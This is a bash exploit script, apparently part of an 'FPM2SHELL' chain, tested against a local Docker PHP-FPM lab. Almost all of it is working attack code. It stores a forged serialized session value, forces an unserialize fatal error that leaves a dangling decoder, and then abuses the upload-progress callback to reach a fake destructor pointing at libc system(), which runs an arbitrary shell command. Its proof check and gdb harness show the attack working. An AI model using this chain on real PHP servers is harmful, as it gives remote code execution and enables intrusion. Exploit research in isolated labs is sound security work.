#!/usr/bin/env bash
# FPM2SHELL module 3f: session-value delivery (HTTP-only, application pattern).
#
#   store : a normal application request stores a binary POST value in
#           $_SESSION and keeps a reference to it, so php's session serializer
#           writes
#               p|s:LEN:"<payload>";upload_progress_fk1|R:1;
#           where <payload> carries the forged php_unserialize_data at file
#           offset STRUCT_OFF.
#   A     : @unserialize() app-level fatal -> dangling php_unserialize_data
#           at D, worker survives.
#   B     : multipart upload-progress callback reads the stored session file
#           with the stale decoder.  R:1 resolves through the forged
#           entries.data[0] to the fake reference; the progress update
#           replaces the same key, zval_ptr_dtor()s the reference and lands
#           in the fake HashTable pDestructor = libc system().
set -u
SID="${F2S_SID:-f2sapp00000000000000000000001}"
D="${F2S_D:-0x7f886e26c000}"
LEN="${F2S_LEN:-65500}"
STRUCT_OFF="${F2S_STRUCT_OFF:-0x1fe8}"
CMD="${F2S_CMD:-id>/tmp/f2s_pwn}"
LAB="$(cd "$(dirname "$0")" && pwd)"
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT

echo "[i] recycling worker"
docker exec f2s-php sh -c "kill \$(pgrep gdb) 2>/dev/null; kill \$(pgrep -f 'pool www') 2>/dev/null" || true
sleep 1.5
PID=$(docker exec f2s-php pgrep -f 'pool www' | head -1)
if [ -z "$PID" ]; then echo "[!] no worker"; exit 1; fi
echo "[i] worker=$PID"

BASE=$(docker exec f2s-php sh -c "awk '/libc\\.so\\.6/ && \$3==\"00000000\" {split(\$1,a,\"-\"); print a[1]; exit}' /proc/$PID/maps")
if [ -z "$BASE" ]; then echo "[!] no libc base"; exit 1; fi
SYSTEM=$(python3 -c "print(hex(int('$BASE',16)+0x53090))")
echo "[i] libc=$BASE system=$SYSTEM"

# ---- store: application writes the session value ---------------------------
echo "[i] build store payload"
python3 "$LAB/m3_app.py" --d "$D" --system "$SYSTEM" --length "$LEN" \
    --struct-off "$STRUCT_OFF" --cmd "$CMD" --out "$TMP/store.bin"
ls -l "$TMP/store.bin"

docker exec f2s-php rm -f "/tmp/sess_$SID"
python3 "$LAB/http_post.py" /store.php "$TMP/store.bin" "$SID"
echo "[i] stored session file:"
docker exec f2s-php sh -c "wc -c /tmp/sess_$SID; head -c 32 /tmp/sess_$SID | od -An -tx1 | head -2; tail -c 40 /tmp/sess_$SID; echo"

# ---- request A: app-level unserialize fatal --------------------------------
python3 - "$TMP" <<'PYEOF'
import sys
B = b"----f2sfatal00000000"
def part(n, b):
    return (b"--" + B + b"\r\nContent-Disposition: form-data; name=\"" + n +
            b"\"\r\n\r\n" + b + b"\r\n")
elems = b"".join(b"i:%d;a:1:{i:0;i:1;}" % i for i in range(40000))
open(sys.argv[1] + "/fatal", "wb").write(
    part(b"filler", b"Q" * 4000000) +
    part(b"data", b"a:%d:{%s}" % (40000, elems)) + b"--" + B + b"--\r\n")
print("[i] fatal body %d bytes" % (len(open(sys.argv[1] + '/fatal', 'rb').read())))
PYEOF

echo "[i] A (fatal)"
python3 "$LAB/http_post.py" /index.php "$TMP/fatal" "$SID"
sleep 0.4

echo "[i] attach gdb"
docker cp "$LAB/g12.gdb" f2s-php:/tmp/g12.gdb
docker exec f2s-php sh -c ": > /tmp/app.out"
docker exec -d f2s-php sh -c "gdb -batch -p $PID -x /tmp/g12.gdb > /tmp/app.out 2>&1"
sleep 2.5

# ---- request B: upload-progress reads the stored session -------------------
python3 - "$TMP" "$SID" <<'PYEOF'
import sys
B = b"----f2supl00000000"
def part(n, v, fn=None):
    h = b"--" + B + b"\r\nContent-Disposition: form-data; name=\"" + n + b"\""
    if fn is not None:
        h += b"; filename=\"" + fn + b"\""
    h += b"\r\n\r\n"
    return h + v + b"\r\n"
body = part(b"PHPSESSID", sys.argv[2].encode())
body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"fk1")
body += part(b"f", b"", b"a")
body += b"--" + B + b"--\r\n"
open(sys.argv[1] + "/b.bin", "wb").write(body)
print("[i] B body %d bytes" % len(body))
PYEOF

echo "[i] B (record)"
python3 "$LAB/http_post.py" /index.php "$TMP/b.bin" "$SID"
sleep 1.0

echo "[i] worker after: $(docker exec f2s-php pgrep -f 'pool www' | head -1)"
echo "[i] proof:"
docker exec f2s-php sh -c "ls -l /tmp/f2s_pwn 2>/dev/null; cat /tmp/f2s_pwn 2>/dev/null"
echo
echo "[i] gdb:"
docker exec f2s-php sh -c "grep -aE 'VARTMP|RCDTOR|SYSTEM|SIGSEGV|^#[0-9]' /tmp/app.out | head -60"
